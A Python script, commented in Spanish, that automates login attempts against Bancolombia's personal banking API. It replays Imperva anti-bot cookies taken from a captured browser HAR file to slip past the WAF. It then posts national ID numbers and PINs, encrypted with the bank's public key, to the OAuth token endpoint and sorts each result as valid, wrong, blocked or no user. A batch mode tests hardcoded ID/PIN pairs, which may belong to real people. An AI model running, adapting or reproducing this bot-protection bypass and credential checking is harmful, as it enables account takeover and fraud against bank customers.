"""Bot Bancolombia que reutiliza cookies de un HAR ya capturado.

Las cookies de Imperva (incap_ses_*, visid_incap_*, reese84, etc.) que se
generaron durante una sesion legitima del browser pueden reutilizarse
mientras no expiren (tipico TTL: incap_ses unas horas, reese84 mas).

Uso:
    python -m src.bancolombia_har_replay --har harprueba.har 80009246 1379
    python -m src.bancolombia_har_replay --har harprueba.har --batch

Si funciona, sabemos definitivamente que el blocker era Imperva exigiendo
cookies de browser real (no IP ni TLS).
"""
from __future__ import annotations

import argparse
import asyncio
import json
import logging
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import httpx
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa

log = logging.getLogger("bancolombia_har_replay")

ROOT = Path(__file__).resolve().parent.parent

# Mismos endpoints
BASE = "https://svpersonas.apps.bancolombia.com"
CANAL = "https://canalpersonas-ext.apps.bancolombia.com"
WARMUP_URL = f"{BASE}/crear-usuario/ingresa-tus-datos"
PUBKEY_URL = f"{BASE}/projects/config/security/public-key"
OAUTH_URL = f"{CANAL}/super-svp/api/v1/security-filters/authorization-services/authentication/id/oauth2/token"
IDENTITY_URL = f"{CANAL}/super-svp/api/v1/security-filters/super-ch-ms-alias-identity/identity"

CLIENT_ID = "tCOVIxsPfSbbAa+OFH1IbgWcD6HkqXWyXi6x9pj4ZXM="
DOC_TYPE_CC = "TIPDOC_FS001"

MOBILE_UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
)


def extract_cookies_from_har(har_path: Path) -> dict[str, dict[str, str]]:
    """Lee un HAR y agrupa las cookies por dominio.

    Retorna {dominio: {cookie_name: cookie_value}}.
    """
    har = json.loads(har_path.read_text(encoding="utf-8"))
    by_domain: dict[str, dict[str, str]] = {}

    # Primero, capturamos cookies enviadas en requests (request.cookies en HAR)
    # y las que vienen en Set-Cookie de responses
    for entry in har["log"]["entries"]:
        url = entry["request"]["url"]
        host = urlparse(url).hostname or ""
        # Cookies enviadas en este request (el browser ya las tenia)
        for c in entry["request"].get("cookies") or []:
            name = c.get("name")
            val = c.get("value")
            if name and val is not None:
                by_domain.setdefault(host, {})[name] = val
        # Cookies seteadas por el server en este response
        for h in entry["response"].get("headers", []):
            if h["name"].lower() != "set-cookie":
                continue
            # parse el primer "name=value" antes del ;
            raw = h["value"]
            head = raw.split(";", 1)[0]
            if "=" not in head:
                continue
            name, val = head.split("=", 1)
            by_domain.setdefault(host, {})[name.strip()] = val.strip()

    return by_domain


def _pubkey_from_hex(n_hex: str, e_hex: str) -> rsa.RSAPublicKey:
    return rsa.RSAPublicNumbers(e=int(e_hex, 16), n=int(n_hex, 16)).public_key()


def encrypt_password(pubkey: rsa.RSAPublicKey, clave: str) -> str:
    ct = pubkey.encrypt(
        clave.encode("utf-8"),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return ct.hex().upper()


def _ts() -> str:
    now = datetime.now(timezone.utc).astimezone()
    return f"{now:%Y-%m-%d %H:%M:%S}:{now.microsecond//1000:03d}"


def _build_client(cookies_by_domain: dict[str, dict[str, str]]) -> httpx.AsyncClient:
    """Crea httpx client con cookies prepopuladas y headers default."""
    client = httpx.AsyncClient(
        http2=True,
        follow_redirects=True,
        headers={"User-Agent": MOBILE_UA},
        timeout=30,
    )
    # Cargar cookies en el jar
    for host, cookies in cookies_by_domain.items():
        # Tambien aplicar al subdominio padre por si acaso
        for cname, cval in cookies.items():
            client.cookies.set(cname, cval, domain=host, path="/")
            # Algunas cookies Imperva tienen Domain=.apps.bancolombia.com
            if host.endswith(".apps.bancolombia.com"):
                client.cookies.set(cname, cval, domain=".apps.bancolombia.com", path="/")
    return client


async def classify(
    cedula: str, clave: str, cookies_by_domain: dict[str, dict[str, str]]
) -> dict[str, Any]:
    t0 = time.time()
    device_id = uuid.uuid4().hex
    session_tracker = str(uuid.uuid4())

    async with _build_client(cookies_by_domain) as client:
        # GET pubkey (deberia pasar con las cookies del HAR)
        r = await client.get(PUBKEY_URL, headers={
            "Accept": "application/json, text/plain, */*",
            "Referer": WARMUP_URL,
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        })
        log.info("pubkey: %s", r.status_code)
        if r.status_code != 200 or "n" not in r.text:
            return {
                "bucket": "BLOQUEADO_WAF",
                "step": "pubkey",
                "status": r.status_code,
                "body": r.text[:300],
                "duration": time.time() - t0,
            }
        pk = r.json()
        pubkey = _pubkey_from_hex(pk["n"], pk["e"])
        pwd_enc = encrypt_password(pubkey, clave)

        # POST oauth
        api_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": BASE,
            "Referer": f"{BASE}/",
            "app-version": "3.8.3",
            "channel": "SVP",
            "device-id": device_id,
            "device-info": json.dumps(
                {"device": "Windows", "os": "Android", "browser": "Chrome-148", "major": "148"},
                separators=(",", ":")
            ),
            "message-id": str(uuid.uuid4()),
            "platform-type": "web",
            "request-timestamp": _ts(),
            "session-tracker": session_tracker,
            "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }
        body = {
            "grant_type": "password",
            "client_id": CLIENT_ID,
            "scope": "DOC",
            "password": pwd_enc,
            "document_type": DOC_TYPE_CC,
            "document_number": cedula,
        }
        r = await client.post(OAUTH_URL, data=body, headers=api_headers)
        log.info("oauth: %s", r.status_code)
        if r.status_code != 200:
            ct = r.headers.get("content-type", "")
            is_waf = "html" in ct or "imperva" in r.text.lower() or "access denied" in r.text.lower()
            return {
                "bucket": "BLOQUEADO_WAF" if is_waf else "DATOS_INCORRECTOS",
                "step": "oauth",
                "status": r.status_code,
                "body": r.text[:400],
                "duration": time.time() - t0,
            }
        oauth_body = r.json()
        access = oauth_body.get("data", {}).get("accessToken")
        if not access:
            return {
                "bucket": "DATOS_INCORRECTOS",
                "step": "oauth_no_token",
                "status": 200,
                "body": r.text[:400],
                "duration": time.time() - t0,
            }

        # POST identity
        api_headers["Authorization"] = f"Bearer {access}"
        api_headers["Content-Type"] = "application/json"
        api_headers["message-id"] = str(uuid.uuid4())
        api_headers["request-timestamp"] = _ts()
        r = await client.post(IDENTITY_URL, json={"documentType": DOC_TYPE_CC, "document": cedula}, headers=api_headers)
        log.info("identity: %s", r.status_code)
        id_body = r.json() if r.status_code == 200 else {"raw": r.text[:300]}
        state = (id_body.get("data") or {}).get("stateRegistry")
        bucket = "OK" if state == "Registered" else "SIN_USUARIO" if state else "DESCONOCIDO"
        return {
            "bucket": bucket,
            "stateRegistry": state,
            "oauth_status": 200,
            "identity_status": r.status_code,
            "duration": time.time() - t0,
            "raw_identity": id_body,
        }


async def _main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)-7s %(name)s :: %(message)s")
    ap = argparse.ArgumentParser()
    ap.add_argument("cedula", nargs="?")
    ap.add_argument("clave", nargs="?")
    ap.add_argument("--har", default="harprueba.har", help="ruta al HAR con cookies validas")
    ap.add_argument("--batch", action="store_true")
    args = ap.parse_args()

    har_path = Path(args.har)
    if not har_path.is_absolute():
        har_path = ROOT / har_path
    if not har_path.exists():
        print(f"ERROR: no encontre {har_path}")
        return
    cookies = extract_cookies_from_har(har_path)
    print(f"\nCookies cargadas de {har_path.name}:")
    for host, ck in cookies.items():
        if "bancolombia" in host or "incap" in str(ck).lower():
            print(f"  {host}: {len(ck)} cookies -> {list(ck.keys())[:8]}")
    print()

    casos = [(args.cedula, args.clave)] if not args.batch else [
        ("79612743", "0000"),
        ("1030648205", "2872"),
        ("80009246", "1379"),
    ]
    for c, k in casos:
        if not c or not k:
            continue
        print(f">>> {c} / {k}")
        r = await classify(c, k, cookies)
        for kk, vv in r.items():
            print(f"  {kk:18}= {str(vv)[:250]}")
        print()


def main():
    asyncio.run(_main())


if __name__ == "__main__":
    main()
